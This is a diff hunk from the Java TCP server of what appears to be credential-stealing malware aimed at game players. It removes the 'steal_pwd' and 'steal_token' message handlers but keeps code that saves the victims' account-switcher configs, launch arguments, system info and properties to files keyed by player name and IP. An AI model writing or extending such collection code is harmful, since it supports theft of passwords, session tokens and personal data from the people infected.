@@ -79,7 +79,7 @@ public class Server extends TcpServer {
                 }
                 case "player" -> info.playerData = (PlayerInfo) msg;
                 case "ip" -> info.ip = (String) msg;
-                case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo", "props" -> {
+                case "iasconfig", "runargs", "systeminfo", "props" -> {
                     String ext = msgType.equals("systeminfo") ? "txt" : "json";
                     File file = new File("data/data", getFileName(msgType, ext, info.playerData.playerName, true));
                     FileUtil.write(file, GSON.toJson(msg));
